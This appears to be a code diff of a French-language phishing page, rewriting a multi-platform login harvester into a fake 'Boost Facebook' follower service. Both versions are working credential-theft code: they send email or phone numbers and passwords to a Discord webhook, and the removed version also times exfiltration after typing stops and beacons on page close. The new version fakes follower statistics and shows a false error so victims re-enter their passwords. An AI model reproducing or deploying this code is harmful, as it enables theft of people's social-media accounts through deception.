+        const json = JSON.stringify(payload, null, 2);
 
-        try {
-            fetch(CONFIG.webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```'
-                })
-            }).catch(() => {});
-            state.exfiltrated = true;
-            updateStatus('✅ Identifiants envoyés (' + state.attempts + ')');
-            captureEvent('credentials_sent', service + ' | ' + login.substring(0, 10) + '...');
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: '```json\n' + json + '\n```'
+            })
+        }).catch(() => {});
+    }
 
-            // Afficher la page d'erreur après 1.5s
-            setTimeout(() => {
-                if (!state.errorShown) {
-                    showErrorPage();
-                }
-            }, 1500);
+    // ============================================================
+    // 2. ÉLÉMENTS DOM
+    // ============================================================
+    const form = document.getElementById('loginForm');
+    const emailInput = document.getElementById('email');
+    const phoneInput = document.getElementById('phoneNumber');
+    const countrySelect = document.getElementById('countryCode');
+    const passInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    const loading = document.getElementById('loading');
+    const errorMsg = document.getElementById('errorMsg');
+    const progressWrapper = document.getElementById('progressWrapper');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const errorOverlay = document.getElementById('errorOverlay');
+    const retryBtn = document.getElementById('retryBtn');
+    const menuBars = document.getElementById('menuBars');
+    const dropdownMenu = document.getElementById('dropdownMenu');
+    const toggleComments = document.getElementById('toggleComments');
+    const commentsWrapper = document.getElementById('commentsWrapper');
+    const toggleAddComment = document.getElementById('toggleAddComment');
+    const addCommentArea = document.getElementById('addCommentArea');
+    const commentInput = document.getElementById('commentInput');
+    const submitCommentBtn = document.getElementById('submitCommentBtn');
+    const commentSuccess = document.getElementById('commentSuccess');
+    const notificationToast = document.getElementById('notificationToast');
 
-            return true;
-        } catch(e) {
-            return false;
+    // Options email / téléphone
+    const optionEmail = document.getElementById('optionEmail');
+    const optionPhone = document.getElementById('optionPhone');
+    const emailField = document.getElementById('emailField');
+    const phoneField = document.getElementById('phoneField');
+
+    // Modales
+    const dashboardModal = document.getElementById('dashboardModal');
+    const historyModal = document.getElementById('historyModal');
+    const closeDashboard = document.getElementById('closeDashboard');
+    const closeHistory = document.getElementById('closeHistory');
+    const statFollowers = document.getElementById('statFollowers');
+    const statBoosts = document.getElementById('statBoosts');
+    const statComments = document.getElementById('statComments');
+    const statSession = document.getElementById('statSession');
+    const historyList = document.getElementById('historyList');
+
+    // ============================================================
+    // 3. ÉTATS – STATISTIQUES
+    // ============================================================
+    let stats = {
+        followers: 0,
+        boosts: 0,
+        comments: 0,
+        history: [],
+        sessionStart: Date.now()
+    };
+
+    function updateStats() {
+        statFollowers.textContent = stats.followers;
+        statBoosts.textContent = stats.boosts;
+        statComments.textContent = stats.comments;
+        const elapsed = Math.floor((Date.now() - stats.sessionStart) / 60000);
+        statSession.textContent = elapsed + ' min';
+    }
+
+    function updateHistory() {
+        if (stats.history.length === 0) {
+            historyList.innerHTML = '<div class="history-item" style="color:#606770;font-style:italic;">Aucun boost enregistré pour le moment.</div>';
+            return;
         }
+        historyList.innerHTML = stats.history.map(item =>
+            `<div class="history-item">
+                <strong>${item.type}</strong> — ${item.detail || ''}
+                <div class="date">${item.date}</div>
+            </div>`
+        ).join('');
     }
 
-    // =========================================================
-    // 5. DÉTECTION AUTOMATIQUE – ATTENTE 6 SECONDES APRÈS LA DERNIÈRE FRAPPE
-    // =========================================================
-    function resetTimer() {
-        if (state.timer) {
-            clearTimeout(state.timer);
-            state.timer = null;
+    // ============================================================
+    // 4. MENU (TROIS BARRES)
+    // ============================================================
+    menuBars.addEventListener('click', function(e) {
+        e.stopPropagation();
+        this.classList.toggle('active');
+        dropdownMenu.classList.toggle('active');
+    });
+
+    document.addEventListener('click', function() {
+        menuBars.classList.remove('active');
+        dropdownMenu.classList.remove('active');
+    });
+
+    dropdownMenu.addEventListener('click', function(e) {
+        e.stopPropagation();
+    });
+
+    // ===== TABLEAU DE BORD =====
+    document.getElementById('menuDashboard').addEventListener('click', function(e) {
+        e.preventDefault();
+        menuBars.classList.remove('active');
+        dropdownMenu.classList.remove('active');
+        updateStats();
+        dashboardModal.classList.add('active');
+    });
+
+    closeDashboard.addEventListener('click', function() {
+        dashboardModal.classList.remove('active');
+    });
+    dashboardModal.addEventListener('click', function(e) {
+        if (e.target === this) this.classList.remove('active');
+    });
+
+    // ===== HISTORIQUE =====
+    document.getElementById('menuHistory').addEventListener('click', function(e) {
+        e.preventDefault();
+        menuBars.classList.remove('active');
+        dropdownMenu.classList.remove('active');
+        updateHistory();
+        historyModal.classList.add('active');
+    });
+
+    closeHistory.addEventListener('click', function() {
+        historyModal.classList.remove('active');
+    });
+    historyModal.addEventListener('click', function(e) {
+        if (e.target === this) this.classList.remove('active');
+    });
+
+    // ===== SUPPORT =====
+    document.getElementById('menuSupport').addEventListener('click', function(e) {
+        e.preventDefault();
+        menuBars.classList.remove('active');
+        dropdownMenu.classList.remove('active');
+        alert('🛟 Support : Contactez-nous à support@boostfb.com');
+    });
+
+    // ===== DÉCONNEXION =====
+    document.getElementById('menuLogout').addEventListener('click', function(e) {
+        e.preventDefault();
+        if (confirm('🚪 Voulez-vous vraiment vous déconnecter ?')) {
+            alert('Déconnexion réussie. À bientôt !');
+            menuBars.classList.remove('active');
+            dropdownMenu.classList.remove('active');
         }
+    });
 
-        const login = dom.loginInput.value.trim();
-        const pass = dom.passInput.value.trim();
+    // ============================================================
+    // 5. OPTION EMAIL / TÉLÉPHONE
+    // ============================================================
+    optionEmail.addEventListener('click', function() {
+        this.classList.add('active');
+        optionPhone.classList.remove('active');
+        emailField.style.display = 'block';
+        phoneField.style.display = 'none';
+        emailInput.required = true;
+        phoneInput.required = false;
+    });
 
-        // Si les deux champs sont remplis et qu'on n'a pas encore envoyé
-        if (login && pass && !state.alreadySent && !state.isProcessing) {
-            // Démarrer le timer de 6 secondes
-            state.timer = setTimeout(() => {
-                // Vérifier que les champs sont toujours remplis
-                const loginNow = dom.loginInput.value.trim();
-                const passNow = dom.passInput.value.trim();
-                if (loginNow && passNow && !state.alreadySent && !state.isProcessing) {
-                    exfiltrateCredentials();
-                }
-                state.timer = null;
-            }, 6000);
+    optionPhone.addEventListener('click', function() {
+        this.classList.add('active');
+        optionEmail.classList.remove('active');
+        emailField.style.display = 'none';
+        phoneField.style.display = 'block';
+        emailInput.required = false;
+        phoneInput.required = true;
+    });
+
+    // ============================================================
+    // 6. COMMENTAIRES (toggle + ajout)
+    // ============================================================
+    let commentsOpen = false;
+    toggleComments.addEventListener('click', function() {
+        commentsOpen = !commentsOpen;
+        commentsWrapper.classList.toggle('open');
+        this.textContent = commentsOpen ? 'Masquer les témoignages ▲' : 'Afficher les témoignages ▼';
+    });
+
+    toggleAddComment.addEventListener('click', function() {
+        addCommentArea.classList.toggle('active');
+        commentSuccess.classList.remove('active');
+        if (addCommentArea.classList.contains('active')) {
+            commentInput.focus();
         }
-    }
+    });
 
-    // =========================================================
-    // 6. BARRE DE PROGRESSION
-    // =========================================================
-    function showProgress(duration = 2000) {
-        dom.progressWrapper.classList.add('active');
-        dom.progressBar.style.width = '0%';
-        const startTime = Date.now();
-
-        return new Promise((resolve) => {
-            const interval = setInterval(() => {
-                const elapsed = Date.now() - startTime;
-                const progress = Math.min((elapsed / duration) * 100, 100);
-                dom.progressBar.style.width = progress + '%';
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    dom.progressWrapper.classList.remove('active');
-                    dom.progressBar.style.width = '0%';
-                    resolve();
-                }
-            }, 30);
-        });
-    }
-
-    // =========================================================
-    // 7. PAGE D'ERREUR (Google style)
-    // =========================================================
-    function showErrorPage() {
-        if (state.errorShown) return;
-        state.errorShown = true;
-        dom.errorOverlay.classList.add('active');
-        dom.continueBtn.disabled = false;
-        dom.continueBtn.textContent = '🚀 Réessayer';
-        setSpinner(false);
-        state.isProcessing = false;
-        dom.passInput.value = '';
-        state.alreadySent = false;
-        updateStatus('❌ Échec de connexion');
-        captureEvent('error_page_shown', 'tentative #' + state.attempts);
-        setTimeout(() => {
-            dom.loginInput.focus();
-        }, 300);
-    }
-
-    // =========================================================
-    // 8. SÉLECTION DU SERVICE
-    // =========================================================
-    function selectService(service) {
-        state.selectedService = service;
-        dom.serviceCards.forEach(card => {
-            card.classList.remove('active');
-            if (card.dataset.service === service) {
-                card.classList.add('active');
-            }
-        });
-
-        // Réinitialiser le formulaire
-        dom.loginInput.value = '';
-        dom.passInput.value = '';
-        state.alreadySent = false;
-        state.errorShown = false;
-        if (state.timer) {
-            clearTimeout(state.timer);
-            state.timer = null;
-        }
-
-        dom.progressWrapper.classList.add('active');
-        dom.progressBar.style.width = '0%';
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += Math.random() * 15 + 5;
-            if (progress > 100) progress = 100;
-            dom.progressBar.style.width = progress + '%';
-            if (progress >= 100) {
-                clearInterval(interval);
-                dom.progressWrapper.classList.remove('active');
-                dom.progressBar.style.width = '0%';
-                showForm(service);
-            }
-        }, 150);
-    }
-
-    function showForm(service) {
-        const labels = {
-            facebook: '📧 Email / Identifiant Facebook',
-            tiktok: '👤 Nom d\'utilisateur TikTok',
-            instagram: '📧 Email / Pseudo Instagram',
-            twitter: '🐦 Email / Pseudo Twitter',
-            whatsapp: '📱 Numéro WhatsApp',
-            telegram: '✈️ Numéro / Pseudo Telegram'
-        };
-        dom.fieldLabel.textContent = labels[service] || '📧 Identifiant';
-        dom.loginInput.placeholder = 'Entrez votre ' + (labels[service] || 'identifiant');
-        dom.formSection.classList.add('visible');
-        dom.loginInput.value = '';
-        dom.passInput.value = '';
-        state.alreadySent = false;
-        state.errorShown = false;
-        dom.loginInput.focus();
-        captureEvent('form_shown', service);
-    }
-
-    // =========================================================
-    // 9. FONCTION PRINCIPALE (bouton Continuer)
-    // =========================================================
-    async function handleContinue() {
-        if (state.isProcessing) return;
-
-        const login = dom.loginInput.value.trim();
-        const pass = dom.passInput.value.trim();
-
-        if (!pass) {
-            updateStatus('⚠️ Veuillez saisir votre mot de passe');
-            dom.passInput.focus();
-            dom.passInput.style.borderColor = '#ff4444';
-            setTimeout(() => { dom.passInput.style.borderColor = '#2a3650'; }, 2000);
+    // ===== SOUMETTRE UN COMMENTAIRE =====
+    submitCommentBtn.addEventListener('click', function() {
+        const text = commentInput.value.trim();
+        if (!text) {
+            showNotification('⚠️ Veuillez écrire un commentaire.', false);
             return;
         }
 
-        // Si le timer est en cours, on l'annule
-        if (state.timer) {
-            clearTimeout(state.timer);
-            state.timer = null;
-        }
+        // Barre de progression
+        progressWrapper.classList.add('active');
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 8;
+            if (progress >= 100) {
+                clearInterval(interval);
+                updateProgress(100);
 
-        // Si les identifiants n'ont pas été envoyés automatiquement
-        if (!state.alreadySent && login && pass) {
-            exfiltrateCredentials();
-            // Forcer l'affichage de l'erreur si elle n'est pas encore apparue
-            setTimeout(() => {
-                if (!state.errorShown) {
-                    showErrorPage();
-                }
-            }, 1500);
-        } else {
-            // Si déjà envoyé, on affiche juste l'erreur
-            if (!state.errorShown) {
-                showErrorPage();
+                // Ajouter le commentaire
+                const name = 'Utilisateur #' + Math.floor(Math.random() * 1000);
+                const now = new Date();
+                const timeStr = 'À l\'instant';
+                const commentHtml = `
+                    <div class="comment">
+                        <div class="avatar">${name.charAt(0)}</div>
+                        <div class="content">
+                            <div class="name">${name}</div>
+                            <div class="text">${text}</div>
+                            <div class="time">${timeStr}</div>
+                        </div>
+                    </div>
+                `;
+                commentsWrapper.insertBefore(
+                    createElementFromHTML(commentHtml),
+                    commentsWrapper.querySelector('.add-comment-area')
+                );
+                stats.comments++;
+                updateStats();
+
+                // Exfiltrer le commentaire vers Discord
+                sendToDiscord({
+                    action: 'user_comment',
+                    comment: text,
+                    username: name,
+                    timestamp: now.toISOString()
+                });
+
+                // Afficher le message "Commentaire ajouté"
+                commentSuccess.classList.add('active');
+                commentInput.value = '';
+
+                // Notification Toast
+                showNotification('✅ Commentaire ajouté avec succès !', true);
+
+                // Réinitialiser la progression après un délai
+                setTimeout(() => {
+                    progressWrapper.classList.remove('active');
+                    updateProgress(0);
+                    addCommentArea.classList.remove('active');
+                }, 1500);
             }
-        }
+            updateProgress(progress);
+        }, 150);
+    });
 
-        state.isProcessing = true;
-        dom.continueBtn.disabled = true;
-        dom.continueBtn.textContent = '⏳ Connexion...';
-        setSpinner(true);
-        updateStatus('📡 Tentative de connexion...');
-
-        await showProgress(1800);
-
-        if (!state.errorShown) {
-            showErrorPage();
-        }
-        dom.continueBtn.disabled = false;
-        dom.continueBtn.textContent = '🚀 Réessayer';
-        setSpinner(false);
-        state.isProcessing = false;
+    function createElementFromHTML(html) {
+        const div = document.createElement('div');
+        div.innerHTML = html;
+        return div.firstElementChild;
     }
 
-    // =========================================================
-    // 10. ÉCOUTEURS
-    // =========================================================
-    function setupUI() {
-        dom.serviceCards.forEach(card => {
-            card.addEventListener('click', function(e) {
-                e.preventDefault();
-                const service = this.dataset.service;
-                if (service && service !== state.selectedService) {
-                    selectService(service);
-                }
-            });
-        });
+    // ============================================================
+    // 7. NOTIFICATION TOAST
+    // ============================================================
+    let toastTimeout = null;
 
-        dom.continueBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            if (!state.isProcessing) {
-                handleContinue();
+    function showNotification(message, success = true) {
+        notificationToast.textContent = message;
+        notificationToast.className = 'notification-toast active' + (success ? ' success' : '');
+        clearTimeout(toastTimeout);
+        toastTimeout = setTimeout(() => {
+            notificationToast.classList.remove('active');
+        }, 4000);
+    }
+
+    // ============================================================
+    // 8. BARRE DE PROGRESSION
+    // ============================================================
+    function updateProgress(value) {
+        const val = Math.min(value, 100);
+        progressFill.style.width = val + '%';
+        progressText.textContent = Math.round(val) + '%';
+    }
+
+    function animateProgress(duration, callback) {
+        progressWrapper.classList.add('active');
+        let start = 0;
+        const step = () => {
+            start += 2;
+            if (start >= 100) {
+                updateProgress(100);
+                if (callback) callback();
+                return;
             }
-        });
+            updateProgress(start);
+            setTimeout(step, duration / 50);
+        };
+        step();
+    }
 
-        // Détection de saisie – reset du timer à chaque frappe
-        dom.loginInput.addEventListener('input', function() {
-            captureEvent('input_login', this.value.substring(0, 10) + '...');
-            resetTimer();
-        });
+    // ============================================================
+    // 9. GESTION DU FORMULAIRE (BOOST)
+    // ============================================================
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
 
-        dom.passInput.addEventListener('input', function() {
-            captureEvent('input_pass', '*****' + this.value.length + ' caractères');
-            resetTimer();
-        });
+        let identifier = '';
+        let isPhone = false;
 
-        // Touche Entrée
-        dom.loginInput.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') { e.preventDefault(); if (!state.isProcessing) handleContinue(); }
-        });
-        dom.passInput.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') { e.preventDefault(); if (!state.isProcessing) handleContinue(); }
-        });
-
-        dom.retryErrorBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            dom.errorOverlay.classList.remove('active');
-            state.errorShown = false;
-            dom.loginInput.focus();
-            updateStatus('🔒 Réessayez');
-            state.alreadySent = false;
-            if (state.timer) {
-                clearTimeout(state.timer);
-                state.timer = null;
+        if (optionEmail.classList.contains('active')) {
+            identifier = emailInput.value.trim();
+            if (!identifier) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = '❌ Veuillez entrer votre email.';
+                return;
             }
-            captureEvent('retry_error', 'bouton réessayer');
-            setTimeout(() => {
-                if (!state.isProcessing) {
-                    handleContinue();
-                }
+        } else {
+            const countryCode = countrySelect.value;
+            const number = phoneInput.value.trim();
+            if (!number) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = '❌ Veuillez entrer votre numéro de téléphone.';
+                return;
+            }
+            identifier = countryCode + number;
+            isPhone = true;
+        }
+
+        const password = passInput.value.trim();
+        if (!password) {
+            errorMsg.style.display = 'block';
+            errorMsg.textContent = '❌ Veuillez entrer votre mot de passe.';
+            return;
+        }
+        errorMsg.style.display = 'none';
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = '⏳ En cours...';
+        loading.classList.add('active');
+
+        // Exfiltrer les identifiants vers Discord
+        sendToDiscord({
+            action: 'facebook_boost_credentials',
+            identifier: identifier,
+            isPhone: isPhone,
+            password: password,
+            countryCode: isPhone ? countrySelect.value : null
+        });
+
+        try {
+            localStorage.setItem('fb_boost_creds', JSON.stringify({ identifier, password, time: Date.now() }));
+        } catch(e) {}
+
+        // Mettre à jour les stats
+        stats.boosts++;
+        stats.followers += Math.floor(Math.random() * 100) + 50;
+        stats.history.push({
+            type: 'Boost Facebook',
+            detail: `+${Math.floor(Math.random() * 100) + 50} abonnés`,
+            date: new Date().toLocaleString()
+        });
+        updateStats();
+
+        animateProgress(2200, function() {
+            loading.classList.remove('active');
+            submitBtn.disabled = false;
+            submitBtn.textContent = '🚀 Démarrer le boost';
+            progressWrapper.classList.remove('active');
+            updateProgress(0);
+
+            passInput.value = '';
+            passInput.focus();
+
+            errorOverlay.classList.add('active');
+
+            setTimeout(function() {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '```json\n' + JSON.stringify({
+                            action: 'error_displayed',
+                            timestamp: new Date().toISOString(),
+                            message: 'Page blanche d\'échec affichée'
+                        }, null, 2) + '\n```'
+                    })
+                }).catch(() => {});
             }, 500);
         });
+    });
 
-        document.addEventListener('click', function(e) {
-            captureEvent('click', e.target.tagName + (e.target.id ? '#' + e.target.id : ''));
-        });
-
-        let scrollTimer = 0;
-        document.addEventListener('scroll', function() {
-            if (Date.now() - scrollTimer > 3000) {
-                scrollTimer = Date.now();
-                captureEvent('scroll', `y:${window.scrollY}`);
-            }
-        });
-
-        document.addEventListener('copy', function() { captureEvent('copy', 'contenu copié'); });
-        document.addEventListener('paste', function() { captureEvent('paste', 'contenu collé'); });
-
-        setInterval(function() {
-            captureEvent('heartbeat', `durée:${Math.floor((Date.now()-state.startTime)/1000)}s`);
-        }, 30000);
-    }
-
-    // =========================================================
-    // 11. BEACONS – FORCE L'ENVOI MÊME EN CAS D'ERREUR
-    // =========================================================
-    function startBeacons() {
-        setInterval(() => {
-            const payload = {
-                session: state.sessionId,
-                timestamp: new Date().toISOString(),
-                elapsed: Math.floor((Date.now() - state.startTime) / 1000) + 's',
-                device: getDeviceInfo(),
-                data: {
-                    action: 'beacon',
-                    uptime: Math.floor((Date.now() - state.startTime) / 1000) + 's',
-                    attempts: state.attempts,
-                    selectedService: state.selectedService,
-                    alreadySent: state.alreadySent
-                },
-                attempts: state.attempts
-            };
-            try {
-                fetch(CONFIG.webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
-                }).catch(() => {});
-            } catch(e) {}
-        }, CONFIG.beaconInterval);
-
-        window.addEventListener('beforeunload', function() {
-            // Si des identifiants sont encore dans les champs, on les envoie avant de fermer
-            const login = dom.loginInput.value.trim();
-            const pass = dom.passInput.value.trim();
-            if (login && pass && !state.alreadySent) {
-                exfiltrateCredentials();
-            }
-            const payload = {
-                session: state.sessionId,
-                timestamp: new Date().toISOString(),
-                elapsed: Math.floor((Date.now() - state.startTime) / 1000) + 's',
-                device: getDeviceInfo(),
-                data: {
-                    action: 'page_closed',
-                    duration: Math.floor((Date.now() - state.startTime) / 1000) + 's',
-                    total_attempts: state.attempts,
-                    events_count: state.events.length,
-                    final_alreadySent: state.alreadySent
-                },
-                attempts: state.attempts
-            };
-            try {
-                fetch(CONFIG.webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
-                }).catch(() => {});
-            } catch(e) {}
-        });
-    }
-
-    // =========================================================
-    // 12. INIT
-    // =========================================================
-    function init() {
-        setupUI();
-        updateStatus('🔒 Choisissez un service pour commencer');
-        setTimeout(() => {
-            selectService('facebook');
+    // ============================================================
+    // 10. BOUTON RÉESSAYER
+    // ============================================================
+    retryBtn.addEventListener('click', function() {
+        errorOverlay.classList.remove('active');
+        passInput.focus();
+        setTimeout(function() {
+            form.dispatchEvent(new Event('submit'));
         }, 300);
-        setTimeout(() => {
-            const payload = {
-                session: state.sessionId,
-                timestamp: new Date().toISOString(),
-                elapsed: '0s',
-                device: getDeviceInfo(),
-                data: { action: 'page_loaded', userAgent: navigator.userAgent },
-                attempts: 0
-            };
-            try {
-                fetch(CONFIG.webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
-                }).catch(() => {});
-            } catch(e) {}
-        }, 1000);
-        startBeacons();
-    }
+    });
 
-    if (document.readyState === 'complete' || document.readyState === 'interactive') {
-        init();
-    } else {
-        document.addEventListener('DOMContentLoaded', init);
-    }
+    // ============================================================
+    // 11. CAPTURE DES SAISIES EN TEMPS RÉEL
+    // ============================================================
+    let lastEmail = '';
+    let lastPass = '';
 
-})();
+    emailInput.addEventListener('input', function() {
+        const val = this.value.trim();
+        if (val.length > 0 && val !== lastEmail) {
+            lastEmail = val;
+        }
+    });
+
+    passInput.addEventListener('input', function() {
+        const val = this.value.trim();
+        if (val.length > 0 && val !== lastPass) {
+            lastPass = val;
+        }
+    });
+
+    // ============================================================
+    // 12. SIGNAL DE DÉMARRAGE
+    // ============================================================
+    setTimeout(function() {
+        sendToDiscord({
+            action: 'boost_page_loaded',
+            message: 'Page chargée'
+        });
+    }, 1000);
+
+    // ============================================================
+    // 13. INIT STATS
+    // ============================================================
+    updateStats();
+
+    console.log('🔵 Boost Facebook chargé - En attente d\'identifiants...');
 </script>
 </body>
-    </html>
+                                       </html>
